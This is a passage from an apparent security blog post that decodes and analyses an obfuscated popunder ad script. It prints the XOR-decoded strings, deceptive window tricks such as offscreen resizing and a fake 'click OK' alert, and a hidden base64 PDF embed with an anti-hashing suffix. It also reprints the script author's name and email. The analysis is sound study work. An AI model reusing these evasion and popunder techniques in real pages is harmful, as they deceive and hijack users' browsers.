6%16%07%06%0176y1%2C%3D76ygx0ejf%20pdrvx6%20%3F%20%3A%23%7B%3D1g%08%25*4%3E%2C8y%2C0%1E(%2C67*35d6'035d8%23%25%3E%2C%3E%03*335d%021*!%3Ad6!'%1C%3C%2F%25%3C%109%3B%239%22%3D1gq5%240(%7F~%7Be%3D1gtj%3B%3Fc%3C8%3B%3B%3Fc%24%25!%20%17%2276y%22%269%1D%23%3A%20%3D1g%3B%22%2014%1A%2F%3B%20%209%268%16)%2F35d4*%2C%26%20%2F%12%3D3%24%3B%2F%24%3B%3Fc%2B%3F%231%2C%2376y%2B%2C%029%2F9%201%05%20%206%26(%24'-)9m%3E9%26%3E1%3D1g%2F9%24!!%2C.%07)6*%20%24)9m%22%3C%3E27%0B(%20-%3F1%3D1g%259%26%2F%24*!)9m%0Dg4%2Bk%2F(%2F%3Em%3B%3Fc'%3F%3A'%26%3F76y!%229(p%23%20%3B9f%22%23(%2Fau947*%3D%3Dt%20%2C-)%26%3Dy%26%2F%22%3A%2F%7Flxqf947*%3D%3Dt)9m%3A%20.%23-y%7Cyzr~%2B(%20-%3F1y%7Cyzr~3%22%3A%23%23%2C%2C%23s%2C%3E%3D%26)r%3E85y%7Dr%262%237wyq-h*%23-%2F%2F%7Fztpsn%7Czv-%23%245%2F%2C0p9*-(r4%2Bk'%2C%3D%2Bz%3B%3Fc%3A%3E%25%2C-*76y%06%2C8'%3E)9m%0F%3B%25%206%26%3Fg%23%24%0C%0635d3%200%26%3D%25'%3B%3Fc%0B8820(%3Bd%3E6%0F%24'%3F%2F%3B%3Fc(%3A')*.(%3E%3E*-b1g%24-%2C.%22%3D63%26%60%2F%2666%2B35d%3B%20-*%3D%22)9m%12%3D%23%3A%20%2C8%3D%15)9m%25(9%11*%208%3A4%2Bk0(%25%2C)9m%3E*82%20-%1476y-%26%2C-4%2Bk.(%3D%2B)9m%08%3F%2F91m*%2C%3E%03%241*%2C%3E)9m%22%2F%2C%24%207%1A%20.%23-%3D1g(8!%3A35d401%3F%2C%24%23%16%20%3F%20%3A%23%3B%3Fc%3E%2F5.*9%08%244-%2C%3F%0B%266%2B(35d%11)%22*76y%071%22%3E927m%3D%26%3A%22%2B'(%3B%0B!%24*!((%3B%20%3D1g)%3B%2C%26%23%3D%13)9m%3F%2C%2C271(%3B4%2Bk%20%25(8%14*'(%08%3E)9m%24%2F86(%2635djx%3D1g%1F%23%2C%2F%3Eg82(%2C%3B%2C%0F%3B%20.('%3E)9m8%3A%2Fw67%3F%20)%23%3B%3Fc%0B8820(%3Bd%3B*-*%1F%2F%256*%22'4%2Bk%22");</code></div>
+
+	<p>Check out <a href="popjs_xor.html">this tool</a> to decode values from these strings. It uses the original functions from the script, and the source is pretty so you can see what it is doing.</p>
+	
+	<p>The first thing to notice about these two functions is that they use a repeating key xor. The second thing to notice is that they helpfully provide their keys as the first argument to the function. <span class="inl-pre"><code>HhcD.A.Z</code></span> uses the key <span class="inl-pre"><code>V1NEWN</code></span> and <span class="inl-pre"><code>C5EEEE.C5.C</code></span> uses the key <span class="inl-pre"><code>JWECMI</code></span>. As they are called throughout the script, the functions are provided an additional argument (because <span class="inl-pre"><code>HhcD.A.Z</code></span> and <span class="inl-pre"><code>C5EEEE.C5.C</code></span> each return a function), and that argument is the index of the value in the plaintext, after being split using the delimiter <span class="inl-pre"><code>~|.</code></span>.</p>
+	
+	<p>Below are the URI decoded strings in their decrypted form.</p>
+	
+	<div class="pre"><code><span style="color:green;">// from HhcD.A.Z</span>
+currentScript~|.Script must be loaded before license file~|.127.0.0.1~|.undefined~|.popads.net~|.popunderjs.com:~|.@network~|. expires~|..local~|./~|.use strict~|. domains~|.192.168.1.99~|.localhost~|.S~|.BetterJsPop~|.object
+<span style="color:green;">// from C5EEEE.C5.C</span>
+concat~|.hasOwnProperty~|.getItem~|.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~|.Utils.createElement~|.newTab~|.data:text/html,&lt;script&gt;window.close();~|.setItem~|.nextSibling~|.window.top.close();~|.z-index:~|.Utils.rand~|.clientX~|.indexOf~|.device~|.cookie~|.object~|.getElementsByTagName~|.test~|.&lt;~|.navigator.requestMIDIAccess({ sysex: true });~|.display:none~|.toString~|.none~|.rd~|.beforeOpen~|.window.self.close();~|.; expires=~|.forceUnder~|.name~|.class~|.[object Array]~|.click~|.Permission~|.delay~|.Cookie.remove~|.boolean~|.pageX~|.changedTouches~|.tagName~|.navigator~|.debug~|.createElement~|.window~|.function~|.request~|.pop~|.undefined~|.apply~|.offsetHeight~|.var popWin = window.open(url, name, opts);~|.popFallbackOptions~|.Storage.set~|.innerWidth~|.userAgent~|.elementFromPoint~|.tabup~|.Storage.get~|.clearTimeout~|.&gt;~|.#~|.2017/4/11~|.Browser.isAndroid~|.https:~|.shift~|.min~|.=[^;]+~|.join~|.window.b();~|.events~|.Utils.time~|.touchstart~|.Event.unbind~|.===~|.javascript~|.dev~|.initOnload~|.detachEvent~|.script~|.close~|.,~|.abcdefghijklmnopqrstuvwxyz~|.location~|.getAttribute~|.Release:~|.contentDocument~|.window.mkp = function(url, name, opts) {~|.} catch (e) {}~|.setInterval~|.try {~|.bind~|.};~|.appendChild~|.outerWidth~|.window.b=function(){window.resizeTo(1,0);window.moveTo(9e5,9e5);};~|.localStorage~|.input~|.57.0.2987.133~|.setAttribute~|.toUpperCase~|.Browser.isOpera~|.Event.bind~|.&lt;script&gt;setTimeout(function(){window.location.href=&quot;~|.opener~|.nodeName~|.under~|.Browser.versionCompare~|.write~|.tabunder~|.data:~|.prototype~|.mousedown~|.Logger.print~|.class~|.LastPopAt~|.Overlay~|.i~|.Phan Thanh Cong &lt;ptcong90@gmail.com&gt;~|.Version:~|.focus~|.cookiePath~|.push~|.href~|.innerHTML~|.contentWindow~|.removeEventListener~|.style~|.mobile~|.visibility:hidden;width:0px;height:0px;position:absolute;top:100%;left:0;pointer-events:none;overflow:hidden;~|.Browser.isMozilla~|.tabunderUrl~|.INPUT~|.&lt;=~|.Browser.version~|.Popunder Script @ popunderjs.com~|.noref~|.(\s|$)~|.Utils.versionCompare~|.toElement~|./~|.Notification~|.div~|.Cookie.set~|.perpage~|.MouseEvents~|.OBJECT~|.src~|.screenX~|.floor~|.; path=~|.replace~|.Storage.remove~|.try { popWin.opener = null; } catch (e) {}~|.cancelBubble~|.Storage.isAvailable~|.attachEvent~|.type~|.clearInterval~|.no-referrer~|.px;~|.Utils.isFlashEnabled~|.about:blank~|.Utils.getParent~|.target~|.ignoreListener~|.&lt;script&gt;~|.display~|.preventDefault~|.=~|.~|.Browser.isFirefox~|.-handled~|.host~|.&lt;/script&gt;~|.Browser.isWebkit~|._blank~|.touchend~|.popunder~|.Utils.merge~|.selector~|.toUTCString~|.Browser.isMobile~|.mobileSensitive~|.substr~|.createEvent~|.top:~|.removeItem~|.coverTags~|.Browser.isWin~|.2.5.20~|.return popWin;~|.parentNode~|.onblur~|.ignore~|.mouseup~|.Browser.isEdge~|.block~|.srcElement~|.stopPropagation~|.(^|\s)~|.A~|.popup~|.setTimeout~|.coverScrollbar~|.blur~|.Browser.isChrome~|.on~|.log~|.zIndex~|.Browser.isIOS~|.application/pdf~|.background:transparent;position:absolute;cursor:pointer;~|.shouldFire~|.timeStamp~|.afterOpen~|.toLowerCase~|.load~|.screen~|.resizeTo~|.getElementById~|.height:~|.left~|.removeChild~|.bindTo~|.window.parent = window.top = window.frameElement = null;~|.document~|.slice~|.(function () {});~|.mimeTypes~|.insertBefore~|.@network~|.Utils.uTimeout~|.Author:~|.ignoreTo~|.BUTTON~|.dispatchEvent~|.console~|.addEventListener~|.Browser.isMac~|.setTime~|.call~|.Logger.log~|.open~|..~|.width~|.pageY~|.offsetLeft~|.id~|.match~|.exec~|.?~|.&amp;~|.BetterJsPop~|.width:~|.initMouseEvent~|.height~|.noReferer~|.max~|.window.alert(&quot;Please click OK to continue.&quot;);&lt;/script&gt;~|.beforeunload~|.data~|.returnValue~|.random~|.text/javascript~|.Cookie.get~|.LABEL~|.top~|.&quot;;}, 1e3);&lt;/script&gt;~|.Browser.isSafari~|.abs~|.offsetTop~|.Utils.addQueryString~|.;base64, ~|.&gt;=~|.url~|.moveTo~|.getTime~|.querySelectorAll~|.cookieExpires~|.button~|.noOpenerHijacking~|.split~|.enabledPlugin~|.outerHeight~|.onclick~|.@.~|.left:~|.number~|.data:text/html,&lt;script&gt;window.close();&lt;/script&gt;~|.width:100%;height:100%;position:fixed;top:0;left:0;z-index:9999999;display:none;~|.data-~|.string~|.Count~|.Browser.isIE~|.desktop~|.Browser.isLinux~|.application/x-shockwave-flash~|.length~|._timeout_~|.hasFocus~|.self~|.screenY~|.head~|.meta~|.Event.getTarget~|.offsetWidth~|.body~|.currentScript~|.webkitAnchorBlank~|.Flag~|.Browser.popunderAvailable~|.clientY~|.referrer~|.charCodeAt~|.iframe~|.==~|.Utils.removeElement~|.use strict~|.Browser.longVersion~|.a</code></div>
+
+	<p>Our output from <span class="inl-pre"><code>C5EEEE.C5.C</code></span> is much longer than the output from <span class="inl-pre"><code>HhcD.A.Z</code></span>. Part of why it is longer is that it contains another encoded value.</p>
+	
+	<div class="pre"><code><span style="color:green;">// index 3</span>
+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</code></div>
+
+	<p>This long value gets assigned to the variable <span class="inl-pre"><code>p</code></span>, and then <span class="inl-pre"><code>jr</code></span> before finally being used inside an anonymous function, in its local function <span class="inl-pre"><code>Ge.Eb</code></span>.</p>
+	
+	<div class="pre"><code><span style="color:green;">// Ge.Eb: function() {</span>
+Eb: function() {
+	var t;
+	this.gb || (
+		<span style="color:green;">// Je.s calls window.document.createElement</span>
+		<span style="color:green;">// zt = "object"</span>
+		this.gb = Je.s(zt, {
+			<span style="color:green;">// jr is used here!</span>
+			<span style="color:green;">// z5EEEE.E8: just returns x + y</span>
+			<span style="color:green;">// Je.H: line ~1088, returns a random string</span>
+			<span style="color:green;">// data: Je.r(Ei, jr) + random_string(length=3)</span>
+			<span style="color:green;">// Ei = "application/pdf"</span>
+			data: z5EEEE.E8(Je.r(Ei, jr), Je.H(3))
+		<span style="color:green;">// Ja = "div"</span>
+		<span style="color:green;">// de = "visibility:hidden;width:0px;height:0px;position:absolute;top:100%;left:0;pointer-events:none;overflow:hidden;"</span>
+		}), t = Je.s(Ja, {
+			style: de
+		}), 
+		<span style="color:green;">// t = the div element</span>
+		<span style="color:green;">// div_element.appendChild(object_element)</span>
+		t[lt](this.gb), 
+		<span style="color:green;">// window.document.body.appendChild(div_element)</span>
+		Fe[ft][lt](t)
+	);
+}</code></div>
+
+<!--
+	<p>What makes this value interesting is the repeating pattern <span class="inl-pre"><code>ACIg</code></span>, of which there are two long strings of that pattern repeated. To me, this gives the impression of some kind of file format. All characters in the index 3 value are alphanumeric (upper case and lower case) in addition to the plus sign and forward slash. These are the characteristics of base64 encoded data.</p>
+-->
+
+	<p>After some more digging, I found that the function <span class="inl-pre"><code>Ge.Yb</code></span> was also acting on <span class="inl-pre"><code>jr</code></span>. In fact, it was setting it to a new value. <span class="inl-pre"><code>Ge.Yb</code></span> executes <span class="inl-pre"><code>jr = Je.q(jr);</code></span>, which reverses its given string argument.</p>
+	
+	<div class="pre"><code><span style="color:green;">// Called by Yb</span>
+<span style="color:green;">// t is the base64 encoded pdf data</span>
+<span style="color:green;">// returns the given string reversed</span>
+q: function(t) {
+	var h9 = C5EEEE.q0(-1180296491),
+		t9 = C5EEEE.j0(486049078),
+		M9 = C5EEEE.T0(2);
+	for (var S9 = 1; C5EEEE.Q5(S9.toString(), S9.toString().length, 36627) !== h9; S9++) {
+		var i, a;
+		a = G;
+		M9 += 2;
+	}
+	if (C5EEEE.W5(M9.toString(), M9.toString().length, 93034) !== t9) {
+		for (i = C5EEEE.w0(t[P], 4); C5EEEE.P0(i, 7); i++) a %= t[i];
+		return a;
+	}
+	var i, a;
+	a = G;
+	<span style="color:green;">// for (i = data.length - 1; i > 0; i--)</span>
+	for (i = t[P] - 1; C5EEEE.N0(i, 0); i--) a += t[i];
+	return a;
+}</code></div>
+
+	<p>Ge.Eb calls the function Je.s, which is below.</p>
+	
+	<div class="pre"><code><span style="color:green;">// Je.s: function(t, i, a) {</span>
+s: function(t, i, a) {
+	var z7 = 219817401,
+		L7 = 1283427228,
+		b7 = 2;
+	<span style="color:green;">// I believe this for loop may as well not even be here. The contents are always executed and return</span>
+	for (var f7 = 1; C5EEEE.W5(f7.toString(), f7.toString().length, 24871) !== z7; f7++) {
+		var n, e;
+		e = C5EEEE.V0(Fe[st](t));
+		for (n in i) Object[B][Pt][S](i, n) || e[Rt](n, i[n]);
+		return C5EEEE.i0(a) || (e[vt] = a), e;
+		b7 += 2;
+	}
+	<span style="color:green;">// And if the for loop doesn't execute, it executes the contents anyway</span>
+	if (C5EEEE.K0(C5EEEE.o5(b7.toString(), b7.toString().length, 26704), L7)) {}
+	<span style="color:green;">// This is the part I'll analyze</span>
+	var n, e;
+	<span style="color:green;">// e = window.document.createElement(t)</span>
+	e = Fe[st](t);
+	for (n in i) Object[B][Pt][S](i, n) && e[Rt](n, i[n]);
+	return C5EEEE.Y0(a) && (e[vt] = a), e;
+}</code></div>
+
+	<p><span class="inl-pre"><code>Je.s</code></span> creates elements in the DOM with the given identifier and attributes.</p>
+	
+	<p>This may be a good time to take a break and look at some obfuscation techniques used by the script. <span class="inl-pre"><code>Je.s</code></span> and <span class="inl-pre"><code>Je.q</code></span> both employ a method of obfuscation in which they declare 3 integer variables, use them as elements of the iterator in a for loop, and then use them again in an if statement. Most of the for loops have return statements within them, which are a required code path through the for loop. This means that if the for loop runs at all, it will only run once. Often enough, it doesn't matter whether the for loop runs at all, because there is an if statement following the for loop which checks for a similar condition. The following function is also called by <span class="inl-pre"><code>Ge.Eb</code></span>, but it is a good example of another case of this for/if obfuscation - neither evaluate. You can see without even evaluating the function <span class="inl-pre"><code>C5EEEE.W5</code></span> that <span class="inl-pre"><code>return (St / t - Ut) * i</code></span> evaluates to <span class="inl-pre"><code>NaN</code></span>, which couldn't possibly be useful. The last line of the function however, would be run if neither the for loop nor the if statement are evaluated. We can see that the return value here is different, and it in fact concatenates some strings. You can see from my comments the values of the obfuscated variables that were assigned from <span class="inl-pre"><code>C5EEEE.C5.C</code></span>.</p>
+	
+	<div class="pre"><code><span style="color:green;">// Je.r: function(t, i)</span>
+<span style="color:green;">// t = "application/pdf"</span>
+<span style="color:green;">// i = the long value</span>
+r: function(t, i) {
+	var s9 = C5EEEE.a0(-794415598),
+		G9 = C5EEEE.f0(1548843164),
+		l9 = C5EEEE.v0(2);
+	<span style="color:green;">// This for loop never runs</span>
+	for (var C7 = 1; C5EEEE.W5(C7.toString(), C7.toString().length, 22092) !== s9; C7++) {
+		<span style="color:green;">// St = "data:"</span>
+		<span style="color:green;">// Ut = ";base64,"</span>
+		return (St / t - Ut) * i;
+		l9 += 2;
+	}
+	<span style="color:green;">// This if statement never runs</span>
+	if (C5EEEE.W5(l9.toString(), l9.toString().length, 91466) !== G9) {
+		return C5EEEE.H0(St / t, Ut) * i;
+	}
+	<span style="color:green;">// This is the actual return value</span>
+	return St + t + Ut + i;
+}</code></div>
+
+	<p>Back to the index 3 <span class="inl-pre"><code>jr</code></span> value. <span class="inl-pre"><code>Ge.Yb</code></span> reverses this base64 data. <span class="inl-pre"><code>Ge.Eb</code></span> sends it to <span class="inl-pre"><code>Je.r</code></span>, which prepends <span class="inl-pre"><code>data:</code></span>, <span class="inl-pre"><code>application/pdf</code></span>, and <span class="inl-pre"><code>;base64,</code></span> to the beginning. <span class="inl-pre"><code>Ge.Eb</code></span> then appends a three character random string, and sends it to <span class="inl-pre"><code>Je.s</code></span> to make a DOM element out of it. <span class="inl-pre"><code>Ge.Eb</code></span> then appends the element to the document body. The random string is likely an anti-virus evasion technique to avoid the file being hashed.</p>
+	
+	<p>Using the tool <span class="inl-pre"><code>pdfextract</code></span>, we see there is one script in the resulting PDF file. It contains one line, <span class="inl-pre"><code>app.alert("Please wait..");</code></span>. I'm not sure how to actually trigger this script. I loaded the same DOM element into a test file, but nothing happened. Opening the PDF using Xpdf in Remnux doesn't give an alert. This is not very interesting.</p>
+	
+	<p>So let's try to track down something that looks cool. Index 296 in <span class="inl-pre"><code>C5EEEE.C5.C</code></span> is <span class="inl-pre"><code>application/x-shockwave-flash</code></span>. Where does that go? It gets assigned to the variable <span class="inl-pre"><code>Pi</code></span>. The only place <span class="inl-pre"><code>Pi</code></span> is used is in the function <span class="inl-pre"><code>Je.L</code></span>.</p>
+	
+	<div class="pre"><code><span style="color:green;">// Je.L: function() {</span>
+<span style="color:green;">// Returns true if flash is enabled, else false.</span>
+L: function() {
+	try {
+		<span style="color:green;">// kr = window.navigator.mimeTypes</span>
+		<span style="color:green;">// Pi = "application/x-shockwave-flash"</span>
+		<span style="color:green;">// Ri = "enabledPlugin"</span>
+		return !!kr[Pi][Ri];
+	} catch (t) {
+		return vr; <span style="color:green;">// 0</span>
+	}
+}</code></div>
+
+	<p><span class="inl-pre"><code>Je.L</code></span> is only used in the following code snippet:</p>
+	
+	<div class="pre"><code>Le[ar] = L5EEEE.w2(Le[ar] || function() {
+	var t, i, a, n, e, r;
+	e = {}, r = {
+		...
+		"Logger.log": [He, He.b],
+		"Browser.isFirefox": Xe._,
+		"Browser.isAndroid": Xe.U,
+		<span style="color:deeppink;">"Utils.isFlashEnabled"</span>: [Je, <span style="color:red;">Je.L</span>], <span style="color:green;">// index 30</span>
+		bindTo: [Ge, Ge.Ya, e],
+		"Cookie.get": [$e, $e.i],
+		...
+	},
+	...</code></div>
+	
+	<p>After we initialize all these object values, we see this for loop:</p>
+	
+	<div class="pre"><code><span style="color:green;">// Loops through given properties and creates calls</span>
+for (t in r)
+	<span style="color:green;">// if (Object.prototype.hasOwnProperty.call(r,t))</span>
+	if (Object[B][Pt][S](r, t)) {
+		<span style="color:green;">// for (n = t.split("."), a = {}, i = 0; i < t.split(".").length - 1) {</span>
+		<span style="color:green;">// 	typeof a[n[i]] === undefined && (a[n[i]] = {}), a = a[n[i]];</span>
+		<span style="color:green;">// }</span>
+		for (n = t[ot](Ht), a = e, i = 0; i < n[P] - 1; i++) L5EEEE.P2(typeof a[n[i]] === E) && (a[n[i]] = {}), a = a[n[i]];
+		<span style="color:green;">// a[n[n.length - 1]] = function(t, i) {</span>
+		<span style="color:green;">//	return Object[B][k][S](t[i]) !== "[object Array]" ? t[i] : 1 === t[i].length ? t[i][0] : function() {</span>
+		<span style="color:green;">//		return 2 == t[i].length ? t[i][1].apply(t[i][0], arguments) : (t[i][1].apply(t[i][0], arguments), t[i][2])</span>
+		<span style="color:green;">//	};</span>
+		<span style="color:green;">// }(r, t);</span>
+		a[n[n[P] - 1]] = function(t, i) {
+			return L5EEEE.N2(Object[B][k][S](t[i]), Oe) ? t[i] : 1 === t[i][P] ? t[i][0] : function() {
+				return 2 === t[i][P] ? t[i][1][L](t[i][0], arguments) : (t[i][1][L](t[i][0], arguments), t[i][2]);
+			};
+		}(r, t);
+	}</code></div>
+	
+	<p>I've commented in all the deobfuscated variables from that code, but it still confuses me. I think that there should be a function now registered as <span class="inl-pre"><code>Utils.isFlashEnabled</code></span>. Whether that happens or not, I don't know. There are no further references to <span class="inl-pre"><code>Utils.isFlashEnabled</code></span> in this script, but it could possibly be referenced by other scripts on the page.</p>
+	
+	<p>Another interesting find in the <span class="inl-pre"><code>C5EEEE.C5.C</code></span> URI encoded string is some personally identifying information.</p>
+	
+	<div class="pre"><code>Index 117: Phan Thanh Cong &lt;ptcong90@gmail.com&gt;</code></div>
+	
+	<p>Unfortunately, this is about the end of the interesting stuff in this script. I thought we were going somewhere with the PDF, but that was fairly disappointing. The string <span class="inl-pre"><code>mailto</code></span> doesn't occur within this script, or either of the decrypted URI encoded strings.</p>
+	
+	<p>To accomplish my goal of finding the true <span class="inl-pre"><code>mailto</code></span> abusing script, I'll first need to get a packet capture in which this actually occurs. I was using Chromium in a Remnux virtual machine, but after going back and trying to click on <i>legitimate</i> <span class="inl-pre"><code>mailto</code></span> links, no dialog even spawns to ask what application I want to use for email. I will probably end up installing ThunderBird so that I will get some kind of reaction.</p>
+	
+	<p>One other option is to configure my iPhone to connect through Burp Suite proxy on my laptop, although I'm worried that may break some of the services on my phone while it's being proxied.</p>
+	
+	<p style="padding-bottom:10px;"><b>Thank you for reading.</b></p>
+		
+</body>
+
+</html>
